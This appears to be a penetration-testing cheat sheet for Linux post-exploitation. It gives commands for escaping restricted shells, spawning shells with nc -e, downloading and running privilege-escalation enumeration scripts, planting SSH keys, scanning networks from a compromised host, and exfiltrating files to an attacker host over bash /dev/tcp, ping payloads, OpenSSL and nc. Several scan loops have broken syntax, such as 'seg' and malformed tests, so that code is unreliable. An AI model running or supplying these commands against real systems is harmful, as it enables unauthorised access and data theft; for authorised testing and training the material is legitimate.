# Linux Enumeration 
**Summary:**

- [Linux Enumeration](#linux-enumeration)
  - [Spawn Interactive Shell and set env](#spawn-interactive-shell-and-set-env)
  - [Auto - Enum tools](#auto---enum-tools)
    - [PEASS - Privilege Escalation Awesome Scripts SUITE](#peass---privilege-escalation-awesome-scripts-suite)
    - [linEnum - High-level summary of the checks/tasks performed](#linenum---high-level-summary-of-the-checkstasks-performed)
    - [linux-smart-enumeration](#linux-smart-enumeration)
  - [pspy - unprivileged linux process snooping](#pspy---unprivileged-linux-process-snooping)
    - [32 bit](#32-bit)
    - [64 bit](#64-bit)
  - [SSH key](#ssh-key)
- [File Exfiltration/Download](#file-exfiltrationdownload)
  - [Upload file](#upload-file)
    - [bash + nc (TCP)](#bash--nc-tcp)
    - [Ping](#ping)
    - [OpenSSL](#openssl)
    - [Progra](#progra)
      - [PHP](#php)
      - [Python3](#python3)
      - [Ruby](#ruby)
      - [Perl](#perl)
  - [Download file](#download-file)
- [Network Scan from traget](#network-scan-from-traget)
  - [Local info](#local-info)
  - [Network scan](#network-scan)
  - [Port Scan](#port-scan)
  - [Check ssh key](#check-ssh-key)
- [Source](#source)



## Spawn Interactive Shell and set env  

    python -c 'import pty;pty.spawn("/bin/bash");'  

    # ctrl z  
    $ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
    $ stty raw -echo; fg  [ENTER]  [ENTER]
    # python -c 'import pty;pty.spawn("/bin/bash");'  
    # stty rows ROWS cols COLS
    # echo $TERM  
    # export TERM=xterm-256color 

Restricted bash

    perl -e 'exec "/bin/sh";'  
    /bin/sh -i  
    exec "/bin/sh";  
    echo os.system('/bin/bash')  
    /bin/sh -i  
    ssh user@$ip nc $localip 4444 -e /bin/sh  
    export TERM=linux  


## Auto - Enum tools

### PEASS - Privilege Escalation Awesome Scripts SUITE
```bash
wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```
### linEnum - High-level summary of the checks/tasks performed
```bash
wget "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" -O /tmp/LinEnum.sh
chmod +x /tmp/LinEnum.sh
/tmp/LinEnum.sh
```

### linux-smart-enumeration
```bash
wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O /tmp/lse.sh
chmod +x /tmp/lse.sh
/tmp/lse.sh -l1
```

## pspy - unprivileged linux process snooping

### 32 bit 
```bash
wget "https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32" -O /tmp/pspy32
chmod +x /tmp/pspy32
/tmp/pspy32 -l1
```
### 64 bit 
```bash
wget "https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64" -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64 -l1
```

## SSH key

> Local

    ssh-keygen

    ssh -i /home/bob/.ssh/id_rsa USERNAME@IP_ADDRESS

> Remote 

    mkdir -m 700 ~/.ssh
    touch ~/.ssh/authorized_keys
    chmod 600 ~/.ssh/authorized_keys

# File Exfiltration/Download 
## Upload file
### bash + nc (TCP)
Client: 
    
    bash < /dev/tcp/IP_ADDRESS/PORT

Server:

    nc -lvnp PORT < FILE
### Ping 

    cat FILE | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 IP_ADDRESS; done
### OpenSSL

Client: 

    openssl s_client -connect IP_ADDRESS:PORT -quiet > FILE

Server:

    openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
    openssl s_server -quiet -accept PORT -cert certificate.pem -key key.pem < FILE
### Progra

#### PHP

```php
php -r '$file = file_get_contents("http://IP_ADDRESS:PORT/FILE"); file_put_contents("FILENAME",$file);'
```

#### Python3
```php
import urllib.request
urllib.request.urlretrieve("http://IP_ADDRESS:PORT/FILE", "FILENAME")
```
#### Ruby
```ruby
ruby -e 'require "net/http"; File.write("FILENAME", Net::HTTP.get(URI.parse("http://IP_ADDRESS:PORT/FILE")))'
```
#### Perl
```perl
perl -e 'use LWP::Simple; getstore("http://IP_ADDRESS:PORT/FILE", "FILENAME");'
```

## Download file 
Target:

    nc IP_ADDRESS 1234 < out.file
    
Source:

    nc -lvnp PORT > FILE

# Network Scan from traget 

## Local info 

- arp -n
- ifconfig -a/ ip a 
- netstat -c
- ip route/route

## Network scan

```bash
for i in $(seg 1 255);do
    ping -c 1 -w 1 192.168.1.$i 1>/dev/null 2>&1
    if([$? -eq 0]); then
        echo "192.168.1.$i Online"
    fi
done
```

## Port Scan 
```bash
portList=(21 22 80 443 445 2222 8000 8080)
# for i in $(portList);do # to try 
for i in $(portList[*]);do
    echo 1 > /dev/tcp/<IP_ADDRESS>/$i 1>/dev/null 2>&1
    if([$? -eq 0]); then
        echo "<IP_ADDRESS> $i Open"
    fi
done
```
## Check ssh key 
    ssh-keyscan <ip-address>
# Source 

    https://github.com/diego-treitos/linux-smart-enumeration